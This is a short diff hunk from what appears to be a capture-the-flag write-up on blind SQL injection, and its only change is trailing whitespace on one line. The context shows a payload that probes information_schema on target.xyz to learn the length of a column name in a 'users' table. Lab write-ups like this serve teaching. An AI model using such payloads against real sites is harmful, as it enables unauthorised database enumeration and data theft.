@@ -132,7 +132,7 @@ got response, means 3 columns in the users table.
 
 [http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 2,1))=8#
 
-3rd column length: 8
+3rd column length: 8 
 
 2.4 extract 1st column name from users table:
 
